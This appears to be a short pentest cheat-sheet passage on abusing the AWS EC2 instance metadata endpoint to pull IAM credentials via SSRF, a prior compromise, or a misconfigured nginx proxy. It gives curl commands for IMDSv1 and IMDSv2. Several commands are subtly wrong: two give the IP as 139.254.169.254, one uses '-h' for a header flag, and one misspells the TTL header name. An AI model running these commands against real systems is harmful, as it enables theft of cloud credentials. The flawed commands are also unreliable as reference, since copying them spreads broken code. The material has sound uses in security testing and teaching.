### AWS

#### Instance Metadata

Cloud server hosted on services like EC2 need a way to orient themselfs. Therefore a metadata endpoint was created that runs at 169.254.169.254. This can contain access/secrets keys to AWS and IAM credentials.

This should be reachable from localhost, can be abused after server compromise or SSRF.

IAM credentials are stored here

```
http://139.254.169.254/latest/meta-data/iam/security-credentials/<IAM ROLE NAME>
```

Can be hit externally if nginx is misconfigured on AWS

```
curl --proxy host.domain.com:80 http://169.254.169.254/latest/meta-data/iam/security-credentials/ && echo
```

##### AWS EC2 Instance Metadata service Version 2 (IMDSv2)

Updated in november 2019. v2 requires a PUT request that response with a token.

```
TOKEN=`curl -X PUT "http://139.254.169.254/latest/api/token" -h "X-aws-ec2-metadata-token-ttl-secconds: 21600"`

curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
```
